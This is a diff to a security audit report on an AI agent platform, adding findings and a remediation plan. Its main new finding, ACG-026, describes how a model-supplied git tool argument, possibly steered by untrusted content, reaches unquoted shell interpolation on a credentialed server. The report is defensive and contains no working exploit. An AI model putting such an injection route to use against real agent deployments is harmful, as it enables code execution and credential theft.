+| Identity, authentication, and authorization | Deficient | Central server route-to-capability mapping, bearer enrollment, signed-write tiers, TLS/mTLS and certificate-pinning support; bearer comparison is constant-time and deliberately non-short-circuiting | ACG-001, ACG-011, ACG-012, ACG-013, ACG-017, ACG-028 |
+| Tool, delegate, workspace, and egress containment | Deficient | Delegate containers are networkless and resource-bounded and the degraded host fallback has been removed entirely; server tool policy exists | ACG-026 (model-controlled shell injection reaching the credentialed server), ACG-028; unsigned instruction artifacts, incomplete ingress integrity, direct egress, skill root escape |
+| Credential custody and cryptography | Deficient | Vault ingestion scrubs bootstrap environment, hardened custody providers exist, secret fingerprints replace raw values in several logs, TLS 1.2 minimum is enforced where TLS is enabled | Auth-free KB path, weak DB1 secret, optional plaintext service links, audit hash coverage/key failure, ACG-030 (identifier CSPRNG fails open to a constant), no complete cryptographic agility or key-lifecycle evidence |
+| Data protection, privacy, retention, and deletion | Deficient | Tenant-aware tables, export/delete functions, configurable redaction, encrypted secret custody | ACG-031 (no content retention control and no data-subject erasure); read isolation is not default-on; global audit views; no authoritative data/purpose/retention/deletion/hold matrix or deletion verification |
 | Audit completeness and tamper evidence | Deficient | Append-only triggers, hash chain, checkpoints, seals, witness support, verification APIs, default operational audit log | ACG-002, ACG-003, ACG-006, ACG-015, ACG-021; no proof that surviving records are complete |
-| Governance, policy, approvals, and accountability | Deficient | Ownership prose, proposal lifecycle, module boundaries, generated API conformance, release environment hooks | No mechanical separation of duties, incomplete control ownership/evidence, coarse agent identity, no governed exception register |
-| Secure development and supply chain | Deficient | Large native test suite, sanitizers, module boundary lint, locked Go/npm dependency graphs, digest assembly of multi-arch images | Reachable Go vulnerability, mutable CI actions, unattested releases, unverified build downloads, broken fuzz gate |
+| Governance, policy, approvals, and accountability | Deficient | Ownership prose, proposal lifecycle, module boundaries, generated API conformance, release environment hooks | ACG-029 (policy reads cannot distinguish "off" from "authority unreachable"); no mechanical separation of duties, incomplete control ownership/evidence, coarse agent identity, no governed exception register |
+| Secure development and supply chain | Deficient | Large native test suite, ~90 bespoke structural `*-check` targets, module boundary lint, locked Go/npm dependency graphs, digest assembly of multi-arch images | ACG-027 (no sanitizer/SAST/secret gate; hardening left to toolchain defaults), reachable Go vulnerability, mutable CI actions, unattested releases, unverified build downloads, broken fuzz gate |
 | Deployment and infrastructure hardening | Deficient | Rootless/delegated isolation options, split deployment, core-dump suppression, bootstrap secret scrubbing, health probes | Critical default KB exposure, superuser DB1, plaintext internal links, auth/rate limits vary by plane |
+| Injection and data-access surface | Pass | DB2 access is parameterised throughout via the named-placeholder rewriter onto `PQexecParams`; the two `IN (%s)` constructions interpolate placeholders and a static subquery, never values. No SQL injection was found | Command construction is the exception, not SQL: see ACG-026 |
 | Detection, incident response, backup, and recovery | Deficient | Health endpoints, audit verification, shutdown forensics, backup/restore tooling and operator guidance | No source evidence of response plan/exercises, alert ownership, RPO/RTO, recurring restore proof, or assured off-host evidence |
 
 ### Trust-boundary and listener inventory
@@ -691,6 +1221,18 @@ Remediation must preserve controls that were confirmed in source or by execution
 - WORM storage provides append triggers, full-sync durability options, chain verification,
   checkpoints, seals and external witness hooks when correctly enabled, although the coverage and
   canonical-record findings prevent a completeness claim;
+- DB2 access is parameterised throughout through the named-placeholder rewriter onto
+  `PQexecParams`; the second pass found no SQL injection anywhere in the tracked tree;
+- bearer comparison is constant-time (`server_ct_equal` → `aimee_core_credential_equal`) and the
+  match loop deliberately declines to short-circuit on a primary hit, so primary, enrolled and
+  invalid credentials cost the same;
+- security-critical randomness fails closed: PKCE verifiers, OIDC login secrets, enrolment tokens
+  and OAuth CSRF state all return an error on CSPRNG failure (ACG-030 records where that discipline
+  stops, on the identifier paths);
+- the container entrypoint drops privilege, exec'ing the server as `aimee` via `runuser` rather than
+  running as root;
+- log hygiene holds: every `LOG_*` call site mentioning token, secret, credential or password
+  reports names, fingerprints and return codes, never secret values;
 - `make lint` passed all 70 checks, and `make build-integrity` passed source existence, target,
   binary linkage, module ownership, credential-bootstrap and product-boundary checks;
 - `make unit-tests` passed the locally executable native suite and all three Go module test suites
@@ -718,8 +1260,11 @@ These are engineering-readiness mappings, not certifications or legal conclusion
 
 ### Immediate disposition
 
-Do not promote the audited commit as an exposed or production-ready deployment while ACG-001 is
-open. Do not represent it as safely multi-user or multi-tenant while ACG-011 through ACG-013 are
+Do not promote the audited commit as an exposed or production-ready deployment while ACG-001 or
+ACG-026 is open. These are independent Critical release blockers reached from opposite directions:
+ACG-001 is an unauthenticated owner surface reached over the network, ACG-026 is arbitrary execution
+on the credentialed server reached through a model-supplied tool argument. Closing one does not
+mitigate the other. Do not represent it as safely multi-user or multi-tenant while ACG-011 through ACG-013 are
 open. Do not represent its governed-action ledger as complete tamper-evident evidence while
 ACG-002, ACG-003, ACG-006, ACG-015, or ACG-021 is open. No product source audit can itself support
 a claim of SOC 2, ISO 27001, privacy-law, or other legal compliance.
@@ -727,9 +1272,13 @@ a claim of SOC 2, ISO 27001, privacy-law, or other legal compliance.
 For an already-running instance, containment precedes redesign: unpublish and network-isolate the
 KB listener; set and rotate its bearer; prohibit anonymous owner/enrollment paths; restrict
 dashboard and `skill.show` access; disable `scope=all` for ordinary identities; disable autonomous
-triggers and live forge for shared/untrusted repositories; and upgrade `golang.org/x/text`. Any
+triggers and live forge for shared/untrusted repositories; disable or restrict the git MCP toolset
+until ACG-026's sink is closed, since any model turn can reach it; and upgrade `golang.org/x/text`. Any
 instance that was reachable with an empty KB bearer must be treated as potentially owner-enrolled:
-review enrollment/audit state and rotate dependent credentials.
+review enrollment/audit state and rotate dependent credentials. Any instance whose git MCP tools
+were reachable by a model processing untrusted content must additionally be treated as potentially
+executed-upon: review shell and git history, and rotate the forge credentials that
+`git_cred_inject_build_env_for_repo` places in that process's environment.
 
 ### Phase 0 — containment and release freeze (0–72 hours)
 
@@ -738,6 +1287,7 @@ review enrollment/audit state and rotate dependent credentials.
 | Block all auth-off KB topologies, remove default port publication, mint a least-privilege server credential, and isolate internal networks | Platform Security | Anonymous/sibling/host negative tests for every image/Compose profile; credential rotation record |
 | Remove ordinary access to global dashboards, caller-selected skill roots and `scope=all` | Identity & Data Authorization | Route-policy diff plus two-user/two-project negative tests |
 | Disable autonomous triggers/live forge in shared deployments until all content ingresses are gated | Agent Security | Configuration migration, startup posture report and hostile-ingress smoke tests |
+| Close the ACG-026 sink: run the git MCP path through `safe_exec_capture_cwd_env_timeout()`'s `argv` vector and validate `path`/`cwd` against the assigned workspace root | Platform Security & Tooling | Injection canary test refuses; no shell interpreter on the git tool path |
 | Upgrade x/text to v0.39.0 or later and require govulncheck | Dependency Maintenance | Clean call-graph scan and invalid-UTF-8 regression |
 | Repair the nightly fuzz build and remove crash-masking `|| true` | Security Testing | Green presubmit build and one retained nightly corpus/crash-artifact run |
 
@@ -758,8 +1308,29 @@ review enrollment/audit state and rotate dependent credentials.
    publish checksums, and verify before promotion.
 5. **Harden the shipped data plane.** Generate DB1 secrets, separate migrator/runtime roles, require
    verified TLS on TCP links, test backup/restore, and make product capability/build parity explicit.
+6. **Remove the quoting trap, not just the sink.** Rename `shell_escape` to `shell_quote`, make it
+   emit a fully quoted token so the compiler forces every one of the ~110 call sites to be
+   revisited, and add a `shell-quote-check` target to required CI (ACG-026 changes 2-4). Closing the
+   sink in Phase 0 removes the live exposure; this removes the mechanism that produced it.
+7. **Make memory-safety defects visible.** Add a required CI job running the unit-test shards under
+   `-fsanitize=address,undefined`, build the fuzz targets with sanitizers, wire the existing
+   `static-analysis`/`cppcheck`/`clang-tidy` targets into `lint`, and add secret scanning
+   (ACG-027). This is sequenced *before* the memory-safety remediation work it exists to validate:
+   without a detector, fixes in ~872k lines of C cannot be shown to have worked.
+8. **Give policy reads a failure channel.** Change the config-accessor generator so a read failure is
+   distinguishable from an explicit `false`, and make security-relevant flags declare their safe
+   default (ACG-029). Pair with the ACG-006/ACG-030 rule below.
+9. **One rule for failure sentinels.** No security-relevant field may be populated with a constant on
+   failure. Apply it jointly to the audit argument-hash (ACG-006) and to identifier generation
+   (ACG-030), and move `platform_random_bytes` onto `getrandom(2)` so the failure being handled
+   becomes rare as well as safe.
+10. **Decide erasure before the chain turns on.** ACG-031's crypto-shredding decision is a
+    **prerequisite** of item 3, not a successor to it. Every governed-action row written after WORM
+    becomes default-on, but before an erasure design exists, is permanently unerasable. This is the
+    single hardest ordering constraint in the programme.
 
-Phase 1 depends on defining identity and canonical evidence schemas before broad migration. Roll out
+Phase 1 depends on defining identity and canonical evidence schemas before broad migration, and on
+the ACG-031-before-item-3 constraint above. Roll out
 tenant enforcement in observe, backfill/quarantine, enforce, and remove-legacy stages; never use a
 silent fail-open compatibility path. Dual-write WORM v1/v2 during a bounded migration, but verify and
 export the versions separately.
@@ -776,6 +1347,18 @@ export the versions separately.
   migrated module processes; include SSRF/DNS-rebinding defense and destination/byte/time budgets;
 - bound MCP lines, events, responses, idle time, total time and restart behavior; make gateway
   pairing CSPRNG-backed, identity-confirmed, unique and transactionally durable;
+- resolve path authorization once rather than per call site: ACG-013 and ACG-028 are a reachable
+  exploit and a shared helper of the same defect, and must be fixed under one invariant — resolve
+  beneath an authorized root with no symlink following, via directory FDs and
+  `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` or a portable no-follow walk — with the helper's
+  ignored bounds parameter honoured and its misleading name corrected;
+- deliver the content retention policy and `aimee kb erase-subject` designed under Phase 1 item 10,
+  with an audited, itemised deletion record and a verification that the WORM chain still verifies
+  across an erasure boundary (ACG-031);
+- adopt a hardened release profile (`-D_FORTIFY_SOURCE=3`, `-fstack-protector-strong`, full RELRO,
+  `-Wformat-security`) rather than inheriting whatever the build host defaults to, and remove
+  `-Wno-format-truncation` so silent truncation of a constructed command or path is a build failure
+  (ACG-027);
 - make Make/CMake security behavior explicit and equivalent, or retire one as a production build.
 
 ### Phase 3 — auditable operating system (90–180 days)
@@ -805,8 +1388,12 @@ A production promotion must fail unless all of the following are machine-verifia
   against real PostgreSQL with pool reuse, pagination, cache and restart cases;
 - governed-action attempts, decisions, effects, terminal results, drops and chain heads reconcile
   with no unexplained gap under crash/storage/queue fault injection;
-- dependency vulnerability gates, all fuzz target builds/runs, secret/history scan, SAST, release
-  input verification, SBOM, signed provenance and consumer signature verification pass;
+- dependency vulnerability gates, all fuzz target builds/runs, secret/history scan, SAST, sanitizer
+  test runs, release input verification, SBOM, signed provenance and consumer signature verification
+  pass, and the shipped binary reports full RELRO, stack canaries and fortified libc calls;
+- no escaped value reaches a shell as an unquoted interpolation (`shell-quote-check`), and no
+  security-relevant configuration read resolves a transport failure to its permissive value
+  (`config-failopen-check`);
 - backup restore meets approved RPO/RTO and produces a signed evidence artifact; incident and access
   review evidence is current for its declared cadence.
 
@@ -838,6 +1425,10 @@ operation from source presence.
 | `npm audit --package-lock-only` | Frontend: one High development advisory; frontend omit-dev: zero; VS Code extension: zero | ACG-010; no production npm advisory established by this check |
 | `make fuzz` | Fail at build: missing `tests/fuzz_memory_search.c` | ACG-024; later fuzz execution is not evidence |
 | `make integration-tests` | Exit 2: 70/71 passed, 1 failed, 64 service-dependent checks skipped | Without `AIMEE_STORE_URL`, DB1 health expected `ok` but was `unavailable`; KB/store/session/workflow checks lacked configured services, so this is not full-stack evidence |
+| `readelf` hardening probe of a shipped binary | PIE, non-executable stack and *partial* RELRO present; **zero** `__stack_chk` and **zero** `_chk` symbols | ACG-027; PIE/NX/partial RELRO come from host toolchain defaults, not a build decision, and stack canaries and fortified libc are absent entirely |
+| Second-pass sweep of shell-command construction (`shell_escape` call sites and their format strings) | ~20 of ~110 sites interpolate an escaped value as a bare `%s` | ACG-026; the reachable sink takes a model-supplied MCP tool argument |
+| Second-pass sweep of `platform_random_bytes` failure handling across all 13 call sites | 6 fail closed, 4 emit a constant, 3 emit a `time()`-seeded value | ACG-030 |
+| Second-pass sweep of generated config accessors | ~380 discard the read status; one call site fixed by hand to compensate | ACG-029 |
 | Targeted credential-pattern scan of tracked content | No apparent live credential verified | This is not a historical/entropy or external secret-platform scan |
 | Semgrep, Trivy, Grype, osv-scanner, Gitleaks, ShellCheck, Bandit, cppcheck, clang-tidy, pip-audit, Syft and cargo-audit | Tools unavailable in audit environment | Their absence is an evidence limitation, not a clean result |
 
